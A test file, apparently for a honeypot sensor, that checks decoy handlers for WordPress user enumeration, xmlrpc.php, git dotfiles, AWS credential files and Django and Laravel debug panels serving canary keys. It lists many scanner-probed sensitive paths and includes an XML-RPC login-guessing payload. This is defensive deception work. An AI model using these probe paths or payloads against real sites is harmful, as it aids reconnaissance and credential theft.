    "/author-sitemap2.xml",
])
def test_wp_user_enum_path_match(path):
    assert tbenv.is_wp_user_enum_path(path)


@pytest.mark.parametrize("path", [
    # Adjacent WP REST namespaces but NOT the user list.
    "/wp-json/wp/v2/users/me",
    "/wp-json/wp/v2/users/me/",
    "/wp-json/wp/v2/posts",
    "/wp-json/gravitysmtp/v1/config",
    # Sitemaps that aren't user shards.
    "/wp-sitemap.xml",
    "/wp-sitemap-posts-post-1.xml",
    "/sitemap.xml",
    # Generic noise.
    "/wp-login.php",
    "/.env",
    "/",
])
def test_wp_user_enum_path_no_match(path):
    assert not tbenv.is_wp_user_enum_path(path)


def test_wp_user_enum_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "WP_USER_ENUM_ENABLED", False)
    assert not tbenv.is_wp_user_enum_path("/wp-json/wp/v2/users")
    assert not tbenv.is_wp_user_enum_path("/wp-sitemap-users-1.xml")
    assert not tbenv.is_wp_user_enum_path("/author-sitemap.xml")


def test_wp_user_enum_rest_list_returns_full_user_array():
    body = tbenv.render_wp_user_enum_rest_list("example.com")
    parsed = json.loads(body.decode("utf-8"))
    assert isinstance(parsed, list)
    assert len(parsed) == len(tbenv._WP_USER_ENUM_FAKE_USERS)
    # First user must look admin-shaped at id 1 (matches stock WP).
    assert parsed[0]["id"] == 1
    assert parsed[0]["slug"] == "admin"
    assert parsed[0]["link"] == "https://example.com/author/admin/"
    assert "avatar_urls" in parsed[0]
    for slot, rendered in zip(tbenv._WP_USER_ENUM_FAKE_USERS, parsed):
        assert rendered["slug"] == slot["slug"]


def test_wp_user_enum_rest_single_known_id_returns_user():
    body = tbenv.render_wp_user_enum_rest_single("example.com", 1)
    parsed = json.loads(body.decode("utf-8"))
    assert parsed["id"] == 1
    assert parsed["slug"] == "admin"
    assert "avatar_urls" in parsed


def test_wp_user_enum_rest_single_unknown_id_returns_wp_error_envelope():
    body = tbenv.render_wp_user_enum_rest_single("example.com", 999)
    parsed = json.loads(body.decode("utf-8"))
    # Mirrors stock WordPress's not-found envelope shape.
    assert parsed["code"] == "rest_user_invalid_id"
    assert parsed["data"]["status"] == 404


def test_wp_user_enum_sitemap_xml_lists_each_fake_author():
    body = tbenv.render_wp_user_enum_sitemap_xml("example.com")
    assert body.startswith(b"<?xml")
    assert b"<urlset" in body
    for slot in tbenv._WP_USER_ENUM_FAKE_USERS:
        assert f"/author/{slot['slug']}/".encode("utf-8") in body


def test_wp_user_enum_yoast_xml_lists_each_fake_author():
    body = tbenv.render_wp_user_enum_yoast_xml("example.com")
    assert body.startswith(b"<?xml")
    for slot in tbenv._WP_USER_ENUM_FAKE_USERS:
        assert f"/author/{slot['slug']}/".encode("utf-8") in body
    # Yoast's lastmod marker is part of its sitemap shape.
    assert b"<lastmod>" in body


@pytest.mark.parametrize("bad_host", [
    "", "host with space", "host\nwith\nnewline", "host\"injected",
])
def test_wp_user_enum_host_falls_back_for_bad_host(bad_host):
    """Invalid Host header must not corrupt JSON / XML output."""
    body = tbenv.render_wp_user_enum_rest_list(bad_host)
    parsed = json.loads(body.decode("utf-8"))
    assert parsed[0]["link"].startswith("https://example.com/")


async def test_dispatch_routes_wp_user_enum_rest_list_to_json(flux_client):
    resp = await flux_client.get(
        "/wp-json/wp/v2/users",
        headers={"X-Forwarded-For": "203.0.113.75", "Host": "example.com"},
    )
    assert resp.status == 200
    assert resp.headers["Content-Type"].startswith("application/json")
    body = await resp.read()
    parsed = json.loads(body.decode("utf-8"))
    assert isinstance(parsed, list) and parsed[0]["slug"] == "admin"
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "wp-user-enum-rest-list"
    assert entries[-1]["wpUserEnumVariant"] == "rest-list"


async def test_dispatch_routes_wp_user_enum_rest_single_unknown_id_404s(flux_client):
    resp = await flux_client.get(
        "/wp-json/wp/v2/users/999",
        headers={"X-Forwarded-For": "203.0.113.76", "Host": "example.com"},
    )
    assert resp.status == 404
    body = await resp.read()
    parsed = json.loads(body.decode("utf-8"))
    assert parsed["code"] == "rest_user_invalid_id"
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "wp-user-enum-rest-single"


async def test_dispatch_routes_wp_user_enum_core_sitemap_to_xml(flux_client):
    resp = await flux_client.get(
        "/wp-sitemap-users-1.xml",
        headers={"X-Forwarded-For": "203.0.113.77", "Host": "example.com"},
    )
    assert resp.status == 200
    assert resp.headers["Content-Type"].startswith("application/xml")
    body = await resp.read()
    assert b"<urlset" in body and b"/author/admin/" in body
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "wp-user-enum-core-sitemap"


async def test_dispatch_routes_wp_user_enum_yoast_sitemap_to_xml(flux_client):
    resp = await flux_client.get(
        "/author-sitemap.xml",
        headers={"X-Forwarded-For": "203.0.113.78", "Host": "example.com"},
    )
    assert resp.status == 200
    body = await resp.read()
    assert b"<lastmod>" in body and b"/author/admin/" in body
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "wp-user-enum-yoast-sitemap"


async def test_dispatch_wp_user_enum_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "WP_USER_ENUM_ENABLED", False)
    resp = await flux_client.get(
        "/wp-json/wp/v2/users",
        headers={"X-Forwarded-For": "203.0.113.79", "Host": "example.com"},
    )
    assert resp.status == 404


# --- WordPress XML-RPC trap (/xmlrpc.php) ---


def test_wp_xmlrpc_enabled_by_default():
    assert tbenv.WP_XMLRPC_ENABLED


@pytest.mark.parametrize("path", ["/xmlrpc.php", "/XMLRPC.PHP"])
def test_wp_xmlrpc_path_match(path):
    assert tbenv.is_wp_xmlrpc_path(path)


@pytest.mark.parametrize("path", [
    "/xmlrpc", "/xmlrpc.php.bak", "/foo/xmlrpc.php",
])
def test_wp_xmlrpc_path_no_match(path):
    assert not tbenv.is_wp_xmlrpc_path(path)


def test_wp_xmlrpc_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "WP_XMLRPC_ENABLED", False)
    assert not tbenv.is_wp_xmlrpc_path("/xmlrpc.php")


def test_render_xmlrpc_fault_escapes_string():
    body = tbenv.render_xmlrpc_fault(fault_code=403, fault_string='Bad <"&> input')
    assert b"<int>403</int>" in body
    assert b"&lt;" in body and b"&amp;" in body and b"&gt;" in body
    assert b"<methodResponse>" in body and b"</methodResponse>" in body


def test_render_xmlrpc_get_landing_matches_wordpress_literal():
    assert tbenv.render_xmlrpc_get_landing() == b"XML-RPC server accepts POST requests only.\n"


async def test_dispatch_xmlrpc_get_returns_landing(flux_client):
    resp = await flux_client.get(
        "/xmlrpc.php",
        headers={"X-Forwarded-For": "203.0.113.80"},
    )
    assert resp.status == 200
    assert resp.headers["Content-Type"].startswith("text/plain")
    body = await resp.read()
    assert b"XML-RPC server accepts POST requests only." in body
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "wp-xmlrpc-get"


async def test_dispatch_xmlrpc_post_captures_body_and_returns_fault(flux_client):
    payload = (
        b"<?xml version=\"1.0\"?>\n"
        b"<methodCall><methodName>wp.getUsersBlogs</methodName>\n"
        b"<params><param><value><string>admin</string></value></param>\n"
        b"<param><value><string>hunter2</string></value></param></params>\n"
        b"</methodCall>"
    )
    resp = await flux_client.post(
        "/xmlrpc.php",
        data=payload,
        headers={
            "X-Forwarded-For": "203.0.113.81",
            "Content-Type": "text/xml",
        },
    )
    assert resp.status == 200
    body = await resp.read()
    assert b"<fault>" in body
    assert b"<int>403</int>" in body
    entries = _log_entries(flux_client.log_path)
    last = entries[-1]
    assert last["result"] == "wp-xmlrpc-post"
    assert "wp.getUsersBlogs" in last["bodyPreview"]
    assert "hunter2" in last["bodyPreview"]


async def test_dispatch_xmlrpc_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "WP_XMLRPC_ENABLED", False)
    resp = await flux_client.get(
        "/xmlrpc.php", headers={"X-Forwarded-For": "203.0.113.82"},
    )
    assert resp.status == 404


# --- WordPress wlwmanifest.xml fingerprint trap ---


def test_wp_wlw_manifest_enabled_by_default():
    assert tbenv.WP_WLW_MANIFEST_ENABLED


@pytest.mark.parametrize("path", [
    "/wp-includes/wlwmanifest.xml",
    "/blog/wp-includes/wlwmanifest.xml",
    "/wp/wp-includes/wlwmanifest.xml",
    "/wp1/wp-includes/wlwmanifest.xml",
    "/wp2/wp-includes/wlwmanifest.xml",
    "/wordpress/wp-includes/wlwmanifest.xml",
    "/site/wp-includes/wlwmanifest.xml",
    "/shop/wp-includes/wlwmanifest.xml",
    "/news/wp-includes/wlwmanifest.xml",
    "/test/wp-includes/wlwmanifest.xml",
    "/cms/wp-includes/wlwmanifest.xml",
    "/web/wp-includes/wlwmanifest.xml",
    "/media/wp-includes/wlwmanifest.xml",
    "/sito/wp-includes/wlwmanifest.xml",
    "/website/wp-includes/wlwmanifest.xml",
    "/2018/wp-includes/wlwmanifest.xml",
    "/2019/wp-includes/wlwmanifest.xml",
    "/2020/wp-includes/wlwmanifest.xml",
    "/2021/wp-includes/wlwmanifest.xml",
    "/WP-INCLUDES/WLWMANIFEST.XML",
])
def test_wp_wlwmanifest_path_match(path):
    assert tbenv.is_wp_wlwmanifest_path(path)


@pytest.mark.parametrize("path", [
    "/wp-includes/wlwmanifest.xml.bak",
    "/wp-includes/",
    "/wlwmanifest.xml",
    "/random/wp-includes/wlwmanifest.xml",
])
def test_wp_wlwmanifest_path_no_match(path):
    assert not tbenv.is_wp_wlwmanifest_path(path)


def test_wp_wlwmanifest_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "WP_WLW_MANIFEST_ENABLED", False)
    assert not tbenv.is_wp_wlwmanifest_path("/wp-includes/wlwmanifest.xml")


def test_render_wp_wlwmanifest_xml_shape():
    body = tbenv.render_wp_wlwmanifest_xml("example.com")
    assert body.startswith(b"<?xml")
    assert b"<manifest xmlns=\"http://schemas.microsoft.com/wlw/manifest/weblog\">" in body
    assert b"<serviceName>WordPress</serviceName>" in body
    assert b"https://example.com/wp-admin/" in body


def test_render_wp_wlwmanifest_xml_bad_host_falls_back():
    body = tbenv.render_wp_wlwmanifest_xml("")
    assert b"https://example.com/wp-admin/" in body


@pytest.mark.parametrize("path", [
    "/wp-includes/wlwmanifest.xml",
    "/blog/wp-includes/wlwmanifest.xml",
    "/wordpress/wp-includes/wlwmanifest.xml",
])
async def test_dispatch_wlwmanifest_serves_manifest(flux_client, path):
    resp = await flux_client.get(
        path, headers={"X-Forwarded-For": "203.0.113.83", "Host": "example.com"},
    )
    assert resp.status == 200
    assert resp.headers["Content-Type"].startswith("application/wlwmanifest+xml")
    body = await resp.read()
    assert b"<serviceName>WordPress</serviceName>" in body
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "wp-wlwmanifest"
    assert entries[-1]["wpWlwManifestPath"] == path


async def test_dispatch_wlwmanifest_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "WP_WLW_MANIFEST_ENABLED", False)
    resp = await flux_client.get(
        "/wp-includes/wlwmanifest.xml",
        headers={"X-Forwarded-For": "203.0.113.84"},
    )
    assert resp.status == 404


# --- Bare git dotfile traps (.gitconfig, .gitignore) ---


def test_git_dotfiles_enabled_by_default():
    assert tbenv.GIT_DOTFILES_ENABLED


@pytest.mark.parametrize("path", [
    "/.gitconfig",
    "/.gitignore",
    "/root/.gitconfig",
    "/root/.gitignore",
    "/home/.gitconfig",
    "/home/.gitignore",
    "/home/ubuntu/.gitconfig",
    "/home/ec2-user/.gitconfig",
    "/.GITCONFIG",
    # Project-tree `.gitignore` enumeration — scanners walk the same
    # subpath dictionary they use for `/<prefix>/.git/config` against
    # `/<prefix>/.gitignore` as well. Match on basename so the
    # dictionary lands on the dotfile handler.
    "/api/.gitignore",
    "/wp-content/.gitignore",
    "/v1/.gitignore",
    "/dist/.gitignore",
    "/backend/.gitignore",
    "/laravel/.gitignore",
    "/symfony/.gitignore",
    "/api/.GITIGNORE",
])
def test_git_dotfile_path_match(path):
    assert tbenv.is_git_dotfile_path(path)


@pytest.mark.parametrize("path", [
    "/.git/config", "/.git/", "/.gitconfig.bak",
    # `/foo/.gitconfig` stays a no-match: `.gitconfig` is a home-dir
    # file, not a project-tree file, so only the enumerated webroot /
    # home-dir variants count. `.gitignore` is the opposite — see
    # the match list.
    "/foo/.gitconfig", "/.gitignore.bak", "/api/.gitignore.bak",
])
def test_git_dotfile_path_no_match(path):
    assert not tbenv.is_git_dotfile_path(path)


def test_git_dotfiles_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "GIT_DOTFILES_ENABLED", False)
    assert not tbenv.is_git_dotfile_path("/.gitconfig")


def test_render_gitconfig_has_per_hit_unique_token():
    a = tbenv.render_gitconfig()
    b = tbenv.render_gitconfig()
    # Both look like a real ~/.gitconfig
    assert b"[user]" in a and b"[credential]" in a
    assert b"\textraheader = Authorization: Bearer ghp_" in a
    # Per-hit unique (no fixed credential literal across hits)
    assert a != b


def test_render_gitignore_lists_secret_patterns():
    body = tbenv.render_gitignore()
    assert b".env\n" in body
    assert b".aws/credentials\n" in body
    assert b"*.pem\n" in body
    assert b"node_modules/\n" in body


async def test_dispatch_gitconfig_serves_canary(flux_client):
    resp = await flux_client.get(
        "/.gitconfig",
        headers={"X-Forwarded-For": "203.0.113.85"},
    )
    assert resp.status == 200
    body = await resp.read()
    assert b"\textraheader = Authorization: Bearer ghp_" in body
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "gitconfig"
    assert entries[-1]["gitDotfilePath"] == "/.gitconfig"


@pytest.mark.parametrize("path", [
    "/root/.gitconfig", "/home/ubuntu/.gitconfig",
])
async def test_dispatch_gitconfig_webroot_variants(flux_client, path):
    resp = await flux_client.get(path, headers={"X-Forwarded-For": "203.0.113.86"})
    assert resp.status == 200
    body = await resp.read()
    assert b"Bearer ghp_" in body
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "gitconfig"


async def test_dispatch_gitignore_serves_listing(flux_client):
    resp = await flux_client.get(
        "/.gitignore",
        headers={"X-Forwarded-For": "203.0.113.87"},
    )
    assert resp.status == 200
    body = await resp.read()
    assert b".aws/credentials\n" in body
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "gitignore"


@pytest.mark.parametrize("path", [
    "/api/.gitignore", "/wp-content/.gitignore", "/v1/.gitignore",
    "/laravel/.gitignore", "/symfony/.gitignore", "/dist/.gitignore",
])
async def test_dispatch_gitignore_project_subpath(flux_client, path):
    """`<prefix>/.gitignore` enumeration — same scanner dictionary that
    walks `/<prefix>/.git/config` walks `<prefix>/.gitignore`. Must land
    on the dotfile handler so it logs `result=gitignore` instead of
    falling through to `not-handled`."""
    resp = await flux_client.get(path, headers={"X-Forwarded-For": "203.0.113.99"})
    assert resp.status == 200
    body = await resp.read()
    assert b".aws/credentials\n" in body
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "gitignore"
    assert entries[-1]["gitDotfilePath"] == path


async def test_dispatch_git_dotfiles_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "GIT_DOTFILES_ENABLED", False)
    resp = await flux_client.get(
        "/.gitconfig", headers={"X-Forwarded-For": "203.0.113.88"},
    )
    assert resp.status == 404


# --- aws.env / aws.json canary traps ---


async def test_dispatch_routes_aws_env_to_trap(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
    resp = await flux_client.get(
        "/aws.env", headers={"X-Forwarded-For": "203.0.113.89"},
    )
    assert resp.status == 200
    body = await resp.read()
    assert b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01" in body
    assert b"AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI" in body
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "aws-env"


@pytest.mark.parametrize("path", [
    "/aws.env", "/aws.env.bak", "/aws.env.local",
    "/aws-credentials.env", "/aws_credentials.env",
])
async def test_aws_env_path_variants_routed(flux_client, monkeypatch, path):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
    resp = await flux_client.get(path, headers={"X-Forwarded-For": "203.0.113.90"})
    assert resp.status == 200
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "aws-env"


async def test_dispatch_routes_aws_json_to_trap(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
    resp = await flux_client.get(
        "/aws.json", headers={"X-Forwarded-For": "203.0.113.91"},
    )
    assert resp.status == 200
    assert resp.headers["Content-Type"].startswith("application/json")
    body = await resp.read()
    parsed = json.loads(body.decode("utf-8"))
    assert parsed["Credentials"]["AccessKeyId"] == "AKIAFAKEEXAMPLE01"
    assert parsed["Credentials"]["SecretAccessKey"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "aws-credentials-json"


@pytest.mark.parametrize("path", [
    "/aws.json", "/aws-credentials.json", "/aws_credentials.json",
    "/.aws/credentials.json",
])
async def test_aws_json_path_variants_routed(flux_client, monkeypatch, path):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
    resp = await flux_client.get(path, headers={"X-Forwarded-For": "203.0.113.92"})
    assert resp.status == 200
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "aws-credentials-json"


# --- Django debug-toolbar canary ---


@pytest.mark.parametrize("path,expected_result", [
    ("/__debug__/render_panel/", "django-debug-toolbar"),
    ("/__debug__/render_panel", "django-debug-toolbar"),
    ("/__debug__/", "django-debug-toolbar"),
    ("/__debug__/sql_select/", "django-debug-toolbar"),
    ("/__debug__/sql_explain/", "django-debug-toolbar"),
    ("/__debug__/sql_profile/", "django-debug-toolbar"),
    ("/__debug__/template_source/", "django-debug-toolbar"),
])
async def test_dispatch_routes_django_debug_toolbar_paths(
    flux_client, monkeypatch, path, expected_result,
):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(path, headers={"X-Forwarded-For": "203.0.113.80"})
    assert resp.status == 200
    body = await resp.read()
    assert b"AKIAFAKEEXAMPLE01" in body
    assert b"Django Debug Toolbar" in body
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == expected_result


def test_django_debug_toolbar_renderer_includes_secret_key_and_env():
    body = tbenv.render_django_debug_toolbar(FAKE_TRACEBIT)
    assert b"SECRET_KEY" in body
    assert b"AWS_ACCESS_KEY_ID" in body
    assert b"DATABASE_URL" in body
    assert b"AKIAFAKEEXAMPLE01" in body


def test_django_debug_toolbar_renderer_per_hit_unique_secret_key():
    body1 = tbenv.render_django_debug_toolbar(FAKE_TRACEBIT)
    body2 = tbenv.render_django_debug_toolbar(FAKE_TRACEBIT)
    import re as _re
    sk1 = _re.search(rb"SECRET_KEY</td><td>'([^']+)'", body1)
    sk2 = _re.search(rb"SECRET_KEY</td><td>'([^']+)'", body2)
    assert sk1 and sk2
    assert sk1.group(1) != sk2.group(1)


def test_client_ip_from_xff_empty():
    assert tbenv.client_ip_from_xff("") == ""
    assert tbenv.client_ip_from_xff("   ") == ""


def test_client_ip_from_xff_single_entry():
    assert tbenv.client_ip_from_xff("8.8.8.8") == "8.8.8.8"


def test_client_ip_from_xff_ignores_spoofed_loopback():
    # A scanner sending "X-Forwarded-For: 127.0.0.1" must not poison
    # attribution; nginx appends the real address to its right.
    assert tbenv.client_ip_from_xff("127.0.0.1, 8.8.8.8") == "8.8.8.8"


def test_client_ip_from_xff_skips_trailing_loopback_hop():
    # Real fleet shape: spoofed left, real client in the middle, an internal
    # loopback proxy hop appended on the right. The middle (real) wins.
    assert tbenv.client_ip_from_xff(
        "127.0.0.1, 8.8.8.8, 127.0.0.1") == "8.8.8.8"


def test_client_ip_from_xff_skips_trailing_private_hops():
    assert tbenv.client_ip_from_xff(
        "1.1.1.1, 8.8.8.8, 10.0.0.3, 127.0.0.1") == "8.8.8.8"


def test_client_ip_from_xff_all_internal_falls_back_to_last():
    assert tbenv.client_ip_from_xff("127.0.0.1, 10.0.0.1") == "10.0.0.1"


def test_client_ip_from_xff_handles_non_ip_tokens():
    # Non-IP tokens (e.g. "unknown") are not treated as internal hops.
    assert tbenv.client_ip_from_xff("unknown, 8.8.8.8, 127.0.0.1") == "8.8.8.8"


def test_client_ip_from_xff_strips_whitespace():
    assert tbenv.client_ip_from_xff(
        "127.0.0.1,   8.8.8.8 , 127.0.0.1 ") == "8.8.8.8"


def test_is_internal_ip():
    assert tbenv._is_internal_ip("127.0.0.1")
    assert tbenv._is_internal_ip("10.0.0.1")
    assert tbenv._is_internal_ip("192.168.1.1")
    assert tbenv._is_internal_ip("::1")
    assert not tbenv._is_internal_ip("8.8.8.8")
    assert not tbenv._is_internal_ip("unknown")


def test_log_context_picks_real_client_through_two_proxy_hops():
    # Mirrors the live fleet XFF exactly: spoofed 127.0.0.1, real client
    # appended by the public nginx, then an internal loopback hop on the
    # right ("127.0.0.1, <real>, 127.0.0.1").
    from aiohttp.test_utils import make_mocked_request

    req = make_mocked_request(
        "GET", "/.env",
        headers={"X-Forwarded-For": "127.0.0.1, 206.189.115.96, 127.0.0.1",
                 "Host": "sensor.example.com"},
    )
    ctx = tbenv._log_context_from_request(req, "req-1", 0, "")
    assert ctx["clientIp"] == "206.189.115.96"


# ============================================================================
# Laravel Telescope debug-panel trap
# ============================================================================


def test_telescope_enabled_by_default():
    assert tbenv.TELESCOPE_ENABLED


def test_telescope_path_matches_observed_endpoints():
    must_match = [
        "/telescope",
        "/telescope/",
        "/telescope/requests",
        "/telescope/queries",
        "/telescope/exceptions",
        "/telescope/logs",
        "/telescope/mail",
        "/telescope/notifications",
        "/telescope/commands",
        "/telescope/jobs",
        "/telescope/cache",
        # Telescope-api JSON endpoints (the SPA's data source)
        "/telescope/telescope-api/requests",
        "/telescope/telescope-api/queries",
        "/telescope/telescope-api/exceptions",
        # `/api/<panel>` proxy-rewrite placement seen in the field
        "/telescope/api/requests",
        "/telescope/api/queries",
        "/telescope/api/mail",
        # Webroot-prefix variants (reverse-proxy rewrites that mount
        # Laravel under an admin / dashboard sub-path)
        "/admin/telescope/api/requests",
        "/admin/telescope/api/logs",
        "/admin/telescope/requests",
        "/dashboard/telescope/requests",
        "/laravel/telescope/queries",
        # Mixed case
        "/TELESCOPE/REQUESTS",
    ]
    for path in must_match:
        assert tbenv.is_telescope_path(path), f"expected match: {path}"


def test_telescope_path_does_not_match_unrelated_paths():
    for path in [
        "/",
        "/telescopex",                 # no slash boundary
        "/telescope-monitor",          # no slash boundary
        "/admin/telescopex/requests",  # no slash boundary
        "/api/_ignition/health-check", # different Laravel-debug trap
        "/.env",
        "/wp-json/wp/v2/users",
    ]:
        assert not tbenv.is_telescope_path(path), f"unexpected match: {path}"


def test_telescope_path_strips_query_string():
    # Real Telescope SPA appends `?period=…&type=…` filters to the JSON-API URL.
    assert tbenv.is_telescope_path(
        "/telescope/telescope-api/requests?period=1_hour&type=ajax",
    )


def test_telescope_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "TELESCOPE_ENABLED", False)
    assert not tbenv.is_telescope_path("/telescope/requests")


def test_telescope_strip_prefix_preserves_unprefixed_paths():
    assert tbenv._telescope_strip_prefix("/telescope") == "/telescope"
    assert tbenv._telescope_strip_prefix("/telescope/requests") == "/telescope/requests"
    # Admin prefix is stripped to the canonical form so the handler
    # dispatches identically on /admin/telescope/<panel> and
    # /telescope/<panel>.
    assert tbenv._telescope_strip_prefix("/admin/telescope/requests") == "/telescope/requests"
    assert tbenv._telescope_strip_prefix("/dashboard/telescope") == "/telescope"


def test_telescope_api_requests_embeds_aws_canary_in_payload_slot():
    body = tbenv.render_telescope_api_requests(FAKE_TRACEBIT, "victim.example").decode("utf-8")
    payload = json.loads(body)
    assert "entries" in payload
    # The first entry is the bait — captured admin S3-settings POST.
    bait = payload["entries"][0]
    assert bait["type"] == "request"
    assert bait["content"]["payload"]["AWS_ACCESS_KEY_ID"] == "AKIAFAKEEXAMPLE01"
    assert (
        bait["content"]["payload"]["AWS_SECRET_ACCESS_KEY"]
        == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    )
    # The user.email and host are per-sensor (no fleet-wide fixed literal).
    assert bait["content"]["user"]["email"] == "admin@victim.example"
    assert bait["content"]["hostname"] == "victim.example"


def test_telescope_api_requests_synthetic_bearer_rotates_per_hit():
    """Bearer / session_id / csrf in the captured headers must be per-hit
    unique so the JSON doesn't fingerprint the fleet by sharing strings."""
    a = json.loads(tbenv.render_telescope_api_requests(FAKE_TRACEBIT, "victim.example"))
    b = json.loads(tbenv.render_telescope_api_requests(FAKE_TRACEBIT, "victim.example"))
    assert (
        a["entries"][0]["content"]["headers"]["authorization"]
        != b["entries"][0]["content"]["headers"]["authorization"]
    )
    assert (
        a["entries"][0]["content"]["headers"]["cookie"]
        != b["entries"][0]["content"]["headers"]["cookie"]
    )
    # The /api/v1/login password slot must also rotate.
    assert (
        a["entries"][1]["content"]["payload"]["password"]
        != b["entries"][1]["content"]["payload"]["password"]
    )


def test_telescope_api_queries_embeds_aws_canary_in_bindings():
    body = tbenv.render_telescope_api_queries(FAKE_TRACEBIT, "victim.example").decode("utf-8")
    payload = json.loads(body)
    bait = payload["entries"][0]
    assert bait["type"] == "query"
    assert bait["content"]["bindings"][0] == "AKIAFAKEEXAMPLE01"
    assert bait["content"]["bindings"][1] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    assert "insert into `settings`" in bait["content"]["sql"]


def test_telescope_api_exceptions_embeds_aws_canary_in_env_dump():
    body = tbenv.render_telescope_api_exceptions(FAKE_TRACEBIT, "victim.example").decode("utf-8")
    payload = json.loads(body)
    bait = payload["entries"][0]
    assert bait["type"] == "exception"
    env = bait["content"]["context"]["env"]
    assert env["AWS_ACCESS_KEY_ID"] == "AKIAFAKEEXAMPLE01"
    assert env["AWS_SECRET_ACCESS_KEY"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    # APP_KEY and DB_PASSWORD must be per-hit synthetics, not fixed
    # literals (rotating value asserted below).
    assert env["APP_KEY"].startswith("base64:")


def test_telescope_api_exceptions_synthetics_rotate_per_hit():
    a = json.loads(tbenv.render_telescope_api_exceptions(FAKE_TRACEBIT, "victim.example"))
    b = json.loads(tbenv.render_telescope_api_exceptions(FAKE_TRACEBIT, "victim.example"))
    assert (
        a["entries"][0]["content"]["context"]["env"]["APP_KEY"]
        != b["entries"][0]["content"]["context"]["env"]["APP_KEY"]
    )
    assert (
        a["entries"][0]["content"]["context"]["env"]["DB_PASSWORD"]
        != b["entries"][0]["content"]["context"]["env"]["DB_PASSWORD"]
    )


def test_telescope_api_mail_embeds_aws_canary_in_ses_transport():
    body = tbenv.render_telescope_api_mail(FAKE_TRACEBIT, "victim.example").decode("utf-8")
    payload = json.loads(body)
    bait = payload["entries"][0]
    assert bait["type"] == "mail"
    assert bait["content"]["transport"]["driver"] == "ses"
    assert bait["content"]["transport"]["key"] == "AKIAFAKEEXAMPLE01"
    assert bait["content"]["transport"]["secret"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"


def test_telescope_api_logs_embeds_aws_canary_in_context():
    body = tbenv.render_telescope_api_logs(FAKE_TRACEBIT, "victim.example").decode("utf-8")
    payload = json.loads(body)
    bait = payload["entries"][0]
    assert bait["type"] == "log"
    assert bait["content"]["level"] == "error"
    assert bait["content"]["context"]["AWS_ACCESS_KEY_ID"] == "AKIAFAKEEXAMPLE01"
    assert (
        bait["content"]["context"]["AWS_SECRET_ACCESS_KEY"]
        == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    )


def test_telescope_api_empty_returns_no_credentials():
    body = tbenv.render_telescope_api_empty()
    payload = json.loads(body)
    assert payload == {"entries": []}


def test_telescope_shell_html_no_fixed_credential_literals():
    body = tbenv.render_telescope_shell_html("victim.example").decode("utf-8")
    # Must not bake AWS keys into the HTML shell (the JSON-API is where
    # canaries live).
    assert "AKIA" not in body
    assert "aws_secret" not in body.lower()
    # CSRF token must be per-hit unique.
    a = tbenv.render_telescope_shell_html("victim.example").decode("utf-8")
    b = tbenv.render_telescope_shell_html("victim.example").decode("utf-8")
    assert a != b
    # The Vue-app bootstrap marker should be present so scanners
    # treating the response as a real Telescope install keep walking.
    assert 'id="telescope"' in body


async def test_dispatch_telescope_shell_returns_html(flux_client):
    """`/telescope/requests` (HTML SPA shell) should return 200 with
    Telescope-shaped HTML and a `telescope-shell` result tag — even
    on keyless deployments (no canary needed for the HTML)."""
    resp = await flux_client.get(
        "/telescope/requests",
        headers={"X-Forwarded-For": "203.0.113.140", "Host": "victim.example"},
    )
    assert resp.status == 200
    assert resp.headers.get("Content-Type", "").startswith("text/html")
    text = await resp.text()
    assert 'id="telescope"' in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "telescope-shell"
